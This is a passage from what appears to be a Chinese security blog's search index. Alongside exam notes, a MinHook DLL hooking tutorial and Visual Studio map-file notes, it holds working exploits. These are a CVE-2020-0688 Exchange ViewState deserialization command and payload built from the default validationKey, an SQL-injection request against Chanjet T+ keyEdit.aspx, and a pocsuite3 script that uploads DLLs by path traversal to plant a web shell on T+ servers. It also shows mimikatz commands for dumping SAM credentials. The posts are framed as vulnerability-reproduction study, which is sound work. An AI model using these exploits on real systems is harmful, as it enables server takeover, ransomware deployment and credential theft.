讲一个请求封装为一个对象，从而使得可以用不同的请求对客户进行参数化；对请求排队或记录请求日志，以及支持可撤销的操作 解释器Interpreter 给定一个语言，定义它的文法的一种表示，并定义一个解释器，这个解释器使用该表示来解释语言中的句子 迭代器Iterator 提供一种方法顺序访问一个聚合对象中的各个元素，且不需要暴露该对象的内部表示 中介者Mediator 用一个中介对象来封装一系列的对象交互 备忘录Memento 在不破坏封装性的前提下捕获一个对象的内部状态，并在对象之外保存这个状态 观察者Observer 定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新 状态State 允许一个对象在其内部状态改变时改变他的行为 策略Strategy 定义一系列的算法，把他们一个个封装起来，并且使它们可以互相替换 模板反复噶Template Method 定义一个操作中的算法骨架，而将一些步骤延迟到子类中 访问者Visitor 表示一个作用于某对象结构中的各元素的操作 网络相关 TCP和UDP协议均提供了端口寻址功能 DNS域名查询的次序是：本地的hosts文件-&gt;本地DNS缓存-&gt;本地DNS服务器-&gt;根域名服务器 网络安全 对称密钥算法（共享密钥加密算法） 非对称密钥算法（公钥、公开密钥加密算法） DES3DESRC-5RC4IDEAAES分组加密算法 RSAECCDSA AES是一种分组加密算法 ARP攻击造成网络无法跨网段通信的原因是伪造网关ARP报文使得数据包无法发送到网关。 DES是共享密钥加密算法 PKI体制中，保证数字证书不被篡改的方法是用CA的私钥对数字证书签名。 PPP认证：PPP扩展认证协议支持多种认证机制 口令验证协议（PAP）：简单的两次握手认证方法，采用文本方式发送密码 质询握手认证协议（CHAP）：安全认证协议是CHAP，它使用三次握手的会话过程传送密文。共享密钥参与计算Hash值，密钥不通过网络传送。也可以进行双向身份认证，终端也可以向服务器进行挑战，使得双方都能确认对方身份的合法性。 X509数字认证证书标准推荐使用的密码算法RAS。而国密SM2数字证书采用的公钥密码算法是ECC基于椭圆曲线的公钥密码算法。ECC算法与RAS算法相比具有加密强度高、计算速度快的优点。 电子邮件相关的协议： SSL HTTPS PGP 网络攻击：主动攻击和被动攻击 主动攻击：攻击者访问他所需信息的故意行为。比如通过远程登录到特定机器的邮件端口以找出企业的邮件服务器的信息；伪造无效IP地址去连接服务器，使接受到错误IP地址的系统浪费时间去连接那个非法地址。攻击者是在主动地做一些不利于你或你的公司系统的事情。主动攻击包括拒绝服务攻击（Dos）、分布式拒绝服务（DDoS）、信息篡改、资源使用、欺骗、伪装、重放等攻击方法 被动攻击主要是收集信息而不进行访问，数据的合法用户对这种活动一点也不会察觉到。被动攻击包括嗅探、信息收集、会话拦截等攻击方法。 DoS攻击 SYN Flooding攻击属于DoS攻击 包过滤防火墙 包过滤技术对应用和用户是透明的 公钥体系中，私钥用于解密和签名，公钥用于加密和验证签名 用户A和B要进行安全通信，通信过程需要双方身份和消息不可否认。A和B通信时可使用数字证书来对用户的身份进行认证；使用数字签名确保消息不可否认。 网络安全包含了网络信息的： 可用性：用户可利用网络时间的百分比 保密性： 完整性：未经授权不能进行修改 真实性：通过数字签名 计算机病毒的特征包括： 传染性、触发性 隐蔽性、感染性 潜伏性、破坏性 访问控制的任务包括授权、确定存取权限、实施存取权限 入侵检测系统： 专家系统 模型检测 简单匹配 应用级防火墙是内部网和外部网的隔离点，它可对应用层的通信数据进行监控和过滤 蠕虫病毒：红色代码、爱虫病毒、熊猫烧香、Nimda病毒、爱丽滋病毒、震网 木马软件：冰河 三网合一的三网是指电信网、广播电视网、互联网 知识产权基础知识 商标权的保护器是可以延长的 合理使用指可以不经著作权人许可，不需支付报酬，使用其作品 软件著作权中翻译权： 将原软件从一种程序设计语言转换成另一种程序设计语言 软件著作权人对其软件享有的以其它各种语言文字形式再表现 对软件的操作界面或者程序中涉及的语言文字翻译成另一种语言文字 引用资料必须是已发表的作品，但只能限于介绍、评论作品，只要不构成自己作品的主要部分，可适当引用资料，而不必征得原作者的同意，不需要向他支付报酬。 政策法规不使用著作权法保护 署名权、修改权、作品完整权受永久保护 必须使用注册商标的是烟草制品 多媒体相关 数字语音的采样频率定义为8KHz，是因为 语音信号定义的频率最高值为4kHz。 由ISO制定的MPEG系列标准中，MPEG-7是多媒体内容描述接口标准","tags":[],"categories":[{"name":"B_书籍资料","slug":"B-书籍资料","permalink":"http://example.com/categories/B-%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/"},{"name":"软件设计师","slug":"B-书籍资料/软件设计师","permalink":"http://example.com/categories/B-%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/"}]},{"title":"【OPenSource】MinHook","date":"2024-05-10T16:00:00.000Z","path":"C_OpenSource/【OPenSource】MinHook/","text":"概述：MinHook——一个mini的Hook库。如何使用及原理解析 MinHook 说明MinHook 是一个用C语言实现的 mini 的 Hook 项目，可同时适用于 x86&#x2F;x64环境下，支持静态编译到项目中，目前 :star: Github Start 4K。 Github地址：TsudaKageyu&#x2F;minhook: The Minimalistic x86&#x2F;x64 API Hooking Library for Windows 使用如何使用 MinHook ？ 使用非常简单，初始化、创建Hook、启用Hook。大致代码如下所示： Hook 实现修改弹窗: 实现Hook MsgBox弹窗,该库的原理与我们上面手动实现的方式是相同的. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/* 代码来自 C/C++ MinHook 库的使用技巧 - lyshark - 博客园https://www.cnblogs.com/LyShark/p/13653435.html*/#include &lt;Windows.h&gt;#include &lt;MinHook.h&gt;#pragma comment(lib,&quot;libMinHook.x86.lib&quot;)typedef int (WINAPI *OldMessageBox)(HWND, LPCSTR, LPCSTR, UINT);OldMessageBox fpMessageBoxA = NULL;int WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)&#123; int ret = fpMessageBoxA(hWnd, &quot;Hook Inject&quot;, lpCaption, uType); return ret;&#125;void SetHook()&#123; if (MH_Initialize() == MB_OK) &#123; MH_CreateHook(&amp;MessageBoxA, &amp;MyMessageBoxA, reinterpret_cast&lt;void**&gt;(&amp;fpMessageBoxA)); MH_EnableHook(&amp;MessageBoxA); &#125;&#125;void UnHook()&#123; if (MH_DisableHook(&amp;MessageBoxA) == MB_OK) &#123; MH_Uninitialize(); &#125;&#125;BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: SetHook(); break; case DLL_PROCESS_DETACH: UnHook(); break; &#125; return TRUE;&#125; 这里还有其他一些例子，参考文章：C&#x2F;C++ MinHook 库的使用技巧 - lyshark - 博客园 MinHook 原理分析参考文章： MinHook 分析01 （x86的jmp+offset类型hook） - 沉疴 - 博客园","tags":[{"name":"OpenSource","slug":"OpenSource","permalink":"http://example.com/tags/OpenSource/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"http://example.com/categories/C-OpenSource/"}]},{"title":"【CVE-2020-0688】exchange远程代码执行漏洞复现","date":"2024-05-10T02:24:53.161Z","path":"A_内功/A_POC探索/Exchange/【CVE-2020-0688】exchange远程代码执行漏洞复现/","text":"概述：CVE-2020-0688 漏洞复现及分析 免责声明：本文所-涉及的信息安全技术知识仅供参考和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。 相关工具下载地址：爱盘 - 最新的在线破解工具包 注意这个漏洞修复的版本，需要修复之前的版本才可以复现。我自己在 Exchange 2016 cu21 上通过 payload 请求对应的接口时返回 400。 [toc] 漏洞说明影响版本Microsoft Exchange Server 2010 Service Pack 3 Microsoft Exchange Server 2013(cu23以下) Microsoft Exchange Server 2016 (cu14以下) Microsoft Exchange Server 2019(cu4以下) 漏洞原理这个漏洞是由于Exchange服务器在安装时没有正确地创建唯一的加密密钥所造成的。 具体来说，与正常软件安装每次都会产生随机密钥不同，所有Exchange Server在安装后的 web.config 文件中都拥有相同的 validationKey 和 decryptionKey。这些密钥用于保证 ViewState 的安全性。而 ViewState 是ASP.NET Web应用以序列化格式存储在客户机上的服务端数据。客户端通过__VIEWSTATE请求参数将这些数据返回给服务器。攻击者可以在 ExchangeControl Panel web 应用上执行任意.net代码。 当攻击者通过各种手段获得一个可以访问Exchange Control Panel （ECP）组件的用户账号密码时。攻击者可以在被攻击的exchange上执行任意代码，直接获取服务器权限。 漏洞复现前提条件需要以下四个变量 想要利用该漏洞，我们需要四个参数，分别为： –validationkey &#x3D; CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因） –validationalg &#x3D; SHA1（默认，漏洞产生原因） –generator&#x3D;B97B4E27（基本默认） –viewstateuserkey &#x3D; ASP.NET_SessionId（手工获取，变量，每次登陆都不一致） 在这四个变量中，前两个为默认固定，viewstateuserkey 和 generator 的值需要从经过身份验证的 session 中收集。viewstateuserkey 可以从ASP.NET的_SessionID cookie 中获取，而 generator 可以在一个隐藏字段__VIEWSTATEGENERATOR 中找到。所有这些都可以通过浏览器中的工具轻松获取。 :star: 获取 viewstateuserkey 和 generator 登录 Exchange 邮箱页面，https://localhost/ecp（管理员页面） 或者 https://localhost/owa（个人页面） 登录成功后，重定到 https://localhost/ecp/defalt.aspx 页面，在 DevTools 中 查看 NetWork 中的 Headers :star: 在 Response 选项卡获取 __VIEWSTATEGENERATOR 字段值 如果未找到此字段不必慌张，直接使用默认值B97B4E27 即可。我这边的环境是 Exchange 2016 CU21 ，没有这个字段。 使用工具生成 payload使用ysoserial.net工具生成反序列化payload。 工具下载地址：https://github.com/pwntester/ysoserial.net/ 生成payload命令： 123ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;calc.exe&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;bf2c6983-d214-4c98-8bd3-d4ee908cc5f0&quot; --isdebug --islegacy 生成内容如下所示： 12345Provided __VIEWSTATEGENERATOR in uint: 3111865895simulateTemplateSourceDirectory returns: /simulateGetTypeName returns: default_aspxCalculated pageHashCode in uint (ignored): 3389719348%2FwEylQcAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC3BTw%2FeG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi0xNiI%2FPg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI%2BDQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BDQogICAgPHNkOlByb2Nlc3M%2BDQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8%2BDQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgY2FsYy5leGUiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M%2BDQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI%2BC%2Fut6Ew7vPiSPAD1%2FpCZkdqGtzlp 相关补丁1234567891011Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30 KB4536989Microsoft Exchange Server 2013 Cumulative Update 23 KB4536988Microsoft Exchange Server 2016 Cumulative Update 14 KB4536987Microsoft Exchange Server 2016 Cumulative Update 15 KB4536987Microsoft Exchange Server 2019 Cumulative Update 3 KB4536987Microsoft Exchange Server 2019 Cumulative Update 4 KB4536987 漏洞分析","tags":[],"categories":[{"name":"A_内功","slug":"A-内功","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POC探索","slug":"A-内功/A-POC探索","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"Exchange","slug":"A-内功/A-POC探索/Exchange","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/Exchange/"}]},{"title":"【SQL注入防御】","date":"2024-05-09T07:06:57.037Z","path":"A_内功/A_POC探索/SQL注入/【SQL注入防御】index/","text":"概述：相关文章整理，思路收集 相关文章综述 初学SQL注入之常见的几种注入类型介绍 - FreeBuf网络安全行业门户 防御 深入理解SQL注入：原理、危害与防御策略-腾讯云开发者社区-腾讯云 相关项目 sql注入防御——libinjection语义识别分析 client9&#x2F;libinjection: SQL &#x2F; SQLI tokenizer parser analyzer client9&#x2F;libinjection: SQL &#x2F; SQLI tokenizer parser analyzer","tags":[],"categories":[{"name":"A_内功","slug":"A-内功","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POC探索","slug":"A-内功/A-POC探索","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"SQL注入","slug":"A-内功/A-POC探索/SQL注入","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"【1Day】畅捷通 keyEdit.aspx SQL 漏洞","date":"2024-05-08T02:52:27.440Z","path":"A_内功/A_POC探索/畅捷通/【1day】畅捷通 keyEdit.aspx SQL 漏洞/","text":"概述：畅捷通 keyEdit.aspx SQL 注入漏洞详解 免责声明：本文所涉及的信息安全技术知识仅供参考和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。 漏洞说明如下图所示，请求对应的接口 keyEdit.aspx 时在参数 KeyID 注入 SQL 语句，responses 返回了查询结果。 POC1234POST /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&amp;preload=1 HTTP/1.1Host: 192.168.19.133:80User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36Content-Length: 0 漏洞分析直接看调用函数，简直不要太明显。KeyID 即请求体参数中的 KeyID 参数的值，这里并没有做任何校验，直接和查询 SQL 拼接。在这里大家也需要注意这种 SQL 语句的写法，太容易被利用，至少也要做参数校验。","tags":[],"categories":[{"name":"A_内功","slug":"A-内功","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POC探索","slug":"A-内功/A-POC探索","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"畅捷通","slug":"A-内功/A-POC探索/畅捷通","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"}]},{"title":"【CNVD-2022-60632】畅捷通TPlus任意文件上传漏洞","date":"2024-05-07T16:00:00.000Z","path":"A_内功/A_POC探索/畅捷通/【CNVD-2022-60632】畅捷通TPlus任意文件上传漏洞/","text":"概述：CNVD-2022-60632 畅捷通 T+ 任意文件上传漏洞 免责声明：本文所涉及的信息安全技术知识仅供参考和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。 漏洞说明漏洞描述2022年8月29日和8月30日，畅捷通公司紧急发布安全补丁修复了畅捷通T+软件任意文件上传漏洞。未经身份认证的攻击者利用该漏洞，通过绕过系统鉴权，在特定配置环境下实现任意文件的上传，从而执行任意代码，获得服务器控制权限。目前，已有用户被不法分子利用该漏洞进行勒索病毒攻击的情况出现。 CNVD对该漏洞的综合评级为“高危”。 影响范围漏洞影响的产品和版本：畅捷通T+单机版&lt;&#x3D;17.0且使用IIS10.0以下版本。 POCPOC 使用了 pocsuit 工具，pocsuit 是使用 Python 编写的一个专门用于 POC 编写开发使用的工具集。 如何使用 pocsuit 工具跑 poc? 以下方 POC 代码为例，运行 POC 命令如下所示： 1pocsuite -r .\\CNVD-2022-60632.py -u http://localhost:80/ --verify 文件架构如下所示： 上传的文件为 bin 目录下的 dll 文件和 compiled 文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from collections import OrderedDictfrom urllib.parse import urljoinimport refrom pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPEfrom pocsuite3.api import OrderedDict, OptStringimport jsonimport osclass ChanJetPOC(POCBase): vulID = &#x27;0&#x27; # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0 version = &#x27;1&#x27; # 默认为1 author = [&#x27;&#x27;] # PoC作者的大名 vulDate = &#x27;2022-09-23&#x27; # 漏洞公开的时间,不知道就写今天 createDate = &#x27;2022-09-23&#x27; # 编写 PoC 的日期 updateDate = &#x27;2022-09-23&#x27; # PoC 更新的时间,默认和编写时间一样 references = [&#x27;&#x27;] # 漏洞地址来源,0day不用写 name = &#x27;畅捷通T+ 任意文件上传&#x27; # PoC 名称 appPowerLink = &#x27;&#x27; # 漏洞厂商主页地址 appName = &#x27;畅捷通T+&#x27; # 漏洞应用名称 appVersion = &#x27;&#x27;&#x27;畅捷通T+单机版&lt;=17.0且使用IIS10.0以下版本&#x27;&#x27;&#x27; # 漏洞影响版本 vulType = VUL_TYPE.UPLOAD_FILES # 漏洞类型,类型参考见 漏洞类型规范表 desc = &#x27;&#x27;&#x27; CNVD-2022-60632 畅捷通T+ 任意文件上传漏洞 &#x27;&#x27;&#x27; # 漏洞简要描述 samples = [&#x27;&#x27;] # 测试样列,就是用 PoC 测试成功的网站 install_requires = [&#x27;&#x27;] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写 pocDesc = &#x27;&#x27;&#x27; 检测:pocsuite -r .\\poc++.py -u url(-f url.txt) --verify &#x27;&#x27;&#x27; category = POC_CATEGORY.EXPLOITS.REMOTE def _verify(self): result = &#123;&#125; path = &quot;/tplus/SM/SetupAccount/Upload.aspx?preload=1&quot; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;, &#125; url = self.url + path filename = os.listdir(&#x27;bin&#x27;) filename_compiled = filename[0] filename_dll = filename[1] try: files = &#123;&quot;File1&quot;: (&quot;../../../bin/&quot;+filename_compiled+&quot;&quot;,open(&#x27;bin/&#x27;+filename_compiled, &quot;rb&quot;), &quot;image/jpeg&quot;)&#125; resq_0 = requests.post(url=url, headers=headers, files=files, timeout=1000) files = &#123;&quot;File1&quot;: (&quot;../../../bin/&quot;+filename_dll+&quot;&quot;,open(&#x27;bin/&#x27;+filename_dll, &quot;rb&quot;), &quot;image/jpeg&quot;)&#125; resq_1 = requests.post(url=url, headers=headers, files=files, timeout=1000) if resq_0.status_code == 200 and resq_1.status_code == 200: result[&#x27;VerifyInfo&#x27;] = &#123;&#125; result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = url result[&#x27;VerifyInfo&#x27;][&#x27;shell&#x27;] = self.url + &#x27;/tplus/shell.aspx?preload=1&#x27; except Exception as e: print(e) return return self.parse_output(result) def _attack(self): return self._verify() def parse_attack(self, result): output = Output(self) if result: output.success(result) else: output.fail(&#x27;target is not vulnerable&#x27;) return output def _shell(self): return def parse_output(self, result): output = Output(self) if result: output.success(result) else: output.fail(&#x27;target is not vulnerable&#x27;) return outputregister_poc(ChanJetPOC) 漏洞分析分析内容参考了其他作者的内容，仅学习记录，供参考。 前提环境，请求的 Params 中 preload 设置为 1 的目的是为了跳过登录认证，这个参数在畅捷通未登录情况下不能少。 漏洞位置为 upload 相关接口。在畅捷通环境下查看相关文件： TPlusStd\\WebSite\\SM\\SetupAccount\\upload.aspx：预编译文件，无实际内容，查看相关编译文件 \\TPlusStd\\WebSite\\bin\\upload.aspx.9475d17f.compiled：upload 相关逻辑预编译文件，指明了产物及编译所需的文件，内容如下所示： 查看编译产物 App_Web_upload.aspx.9475d17f.dll，通过 dnSpy 查看 dll 内容。 dnSpy 反编译的 Page_Load 函数内容如下所示： 1234567891011121314151617181920212223242526272829303132333435363738394041424344// Token: 0x06000004 RID: 4 RVA: 0x000020AC File Offset: 0x000002AC protected void Page_Load(object sender, EventArgs e) &#123; this.ReadResources(); if (base.Request.Files.Count == 1) &#123; string text = &quot;images/index.gif&quot;; object obj = this.ViewState[&quot;fileName&quot;]; if (obj != null) &#123; text = obj.ToString(); &#125; if (this.File1.PostedFile.ContentLength &gt; 204800) &#123; base.Response.Write(string.Concat(new string[] &#123; &quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;, this.PhotoTooLarge, &quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;, text, &quot;&#x27;;&lt;/script&gt;&quot; &#125;)); return; &#125; if (this.File1.PostedFile.ContentType != &quot;image/jpeg&quot; &amp;&amp; this.File1.PostedFile.ContentType != &quot;image/bmp&quot; &amp;&amp; this.File1.PostedFile.ContentType != &quot;image/gif&quot; &amp;&amp; this.File1.PostedFile.ContentType != &quot;image/pjpeg&quot;) &#123; base.Response.Write(string.Concat(new string[] &#123; &quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;, this.PhotoTypeError, &quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;, text, &quot;&#x27;;&lt;/script&gt;&quot; &#125;)); return; &#125; string fileName = this.File1.PostedFile.FileName; string text2 = fileName.Substring(fileName.LastIndexOf(&#x27;\\\\&#x27;) + 1); this.File1.PostedFile.SaveAs(base.Server.MapPath(&quot;.&quot;) + &quot;\\\\images\\\\&quot; + text2); string value = base.Server.MapPath(&quot;.&quot;) + &quot;\\\\images\\\\&quot; + text2; this.ViewState[&quot;fileName&quot;] = &quot;images/&quot; + text2; this.Session[&quot;ImageName&quot;] = value; &#125; &#125; 函数的大致逻辑就是检查参数的 Content-Type 和文件大小（小于 200 KB），检查通过的话函数会继续往下执行。在 接口请求时已经修改过上传文件的 Content-Type 了，并且文件的大小也符合条件。条件允许范围内，任意后缀文件都可以上传。 附加到畅捷通进程调试截图如下所示： 可以看到上图这里已经保存了上传的文件。 补充：补充一下 preload 参数的校验逻辑 找一下 App_Web_upload.aspx.9475d17f 依赖的dll.yquuwybqrjce{zoom:50%;}.vrfdthhgihyt{zoom:50%;} 查找和登录鉴权相关的接口 判断条件如下所示，当 flag 或者是以下所示的请求路径时，才会走到最终的请求，否则会在当前这个函数（ Application_PreRequestHandlerExecute）处理请求","tags":[],"categories":[{"name":"A_内功","slug":"A-内功","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POC探索","slug":"A-内功/A-POC探索","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"畅捷通","slug":"A-内功/A-POC探索/畅捷通","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"}]},{"title":"mimikatz","date":"2024-05-06T16:00:00.000Z","path":"C_OpenSource/mimikatz/","text":"概述：mimikatz 项目使用及解析 lsadump命令帮助1234567891011121314151617181920212223242526272829# 提权privilege::debug# 读取samlsadump::sam# 查看帮助手册mimikatz # lsadump::ERROR mimikatz_doLocal ; &quot;(null)&quot; command of &quot;lsadump&quot; module not found !Module : lsadumpFull name : LsaDump module sam - Get the SysKey to decrypt SAM entries (from registry or hives) secrets - Get the SysKey to decrypt SECRETS entries (from registry or hives) cache - Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives) lsa - Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject) trust - Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly) backupkeys rpdata dcsync - Ask a DC to synchronize an object dcshadow - They told me I could be anything I wanted, so I became a domain controller setntlm - Ask a server to set a new password/ntlm for one user changentlm - Ask a server to set a new password/ntlm for one user netsync - Ask a DC to send current and previous NTLM hash of DC/SRV/WKS packages mbc zerologon postzerologon","tags":[{"name":"OpenSource","slug":"OpenSource","permalink":"http://example.com/tags/OpenSource/"},{"name":"mimikatz","slug":"mimikatz","permalink":"http://example.com/tags/mimikatz/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"http://example.com/categories/C-OpenSource/"}]},{"title":"【Visual Studio】查看符号导入信息","date":"2024-04-23T16:00:00.000Z","path":"A_OS/Windows/Visual Studio/【Visual Studio】查看符号导入信息/","text":"概述：通过 map 文件查看引入的函数都是从哪个文件导入的 0x01 问题描述两个项目引入了同样的 lib 文件，一个编译没问题，但是另外一个编译报错链接错误，遇到这样的问题你该怎么办？ ：可以使用编程成功工程的 map 文件查看函数是通过哪个 lib 被链接到目标文件的 0x02 配置生成 map步骤一：关闭增量链接 步骤二：开启生成映射文件并设置映射文件名 配置完成之后编译工程就能生成 map 文件了。 可以查看 map 文件查看导入函数的一些信息。 0x03 map 分析示例一段 map 文件内容 123456789100001:00237500 _crc32@12 10238500 f zlibstat_VC2017_x86_MTd:crc32.obj 0001:00237520 _crc32_z@12 10238520 f zlibstat_VC2017_x86_MTd:crc32.obj 0001:00237770 _crc32_combine@12 10238770 f zlibstat_VC2017_x86_MTd:crc32.obj 0001:00237790 _get_crc_table@0 10238790 f zlibstat_VC2017_x86_MTd:crc32.obj 0001:00238470 _crc32_combine64@16 10239470 f zlibstat_VC2017_x86_MTd:crc32.obj 0001:00238490 _deflate@8 10239490 f zlibstat_VC2017_x86_MTd:deflate.obj 0001:002394b0 _deflateEnd@4 1023a4b0 f zlibstat_VC2017_x86_MTd:deflate.obj 0001:002395c0 _deflateSetDictionary@12 1023a5c0 f zlibstat_VC2017_x86_MTd:deflate.obj 0001:00239830 _deflateGetDictionary@12 1023a830 f zlibstat_VC2017_x86_MTd:deflate.obj 0001:002398d0 _deflateCopy@8 1023a8d0 f zlibstat_VC2017_x86_MTd:deflate.obj 解析： 这段内容来自于一个 .map 文件，它是链接器在编译和链接过程结束后生成的，包含了程序中符号的地址、类型和一些其他信息。这个特定的 .map 文件片段列出了与 zlib 压缩库相关的一些函数。以下是对这些条目的分析： 每一列的具体含义可能因编译器和链接器的不同而略有不同，但通常包括： 地址：符号在内存中的地址。 装饰后的名称：C++ 编译器可能会对函数名称进行装饰，以包含关于函数签名的信息。 原始名称：如果装饰后的名称存在，原始名称也会被列出。 大小：符号的大小（通常是函数的代码大小）。 段：符号所在的内存段。 文件名：符号定义的源文件。 _crc32@12、_crc32_z@12、_crc32_combine@12、_crc32_combine64@16：这些是 CRC32 校验函数的不同版本，@12 和 @16 表示函数的参数大小（以字节为单位）。CRC32 是一种常用的数据校验算法。 _get_crc_table@0：这个函数可能返回一个 CRC32 表的指针，该表用于优化 CRC32 计算。 _deflate@8、_deflateEnd@4、_deflateSetDictionary@12、_deflateGetDictionary@12、_deflateCopy@8：这些函数是 zlib 压缩库中用于数据压缩的不同函数。_deflate@8 是压缩数据的主要函数，而 _deflateEnd@4 用于清理压缩流。_deflateSetDictionary@12 和 _deflateGetDictionary@12 用于设置和获取压缩字典，这可以提高压缩效率。_deflateCopy@8 可能用于复制压缩流的状态。 每个函数后面的 f 可能表示这些符号是文件（file）级别的，即它们是可执行文件或库文件的一部分，而不是导入的。 zlibstat_VC2017_x86_MTd:crc32.obj 和 zlibstat_VC2017_x86_MTd:deflate.obj 表示这些符号分别来自 crc32.obj 和 deflate.obj 对象文件，这些对象文件是 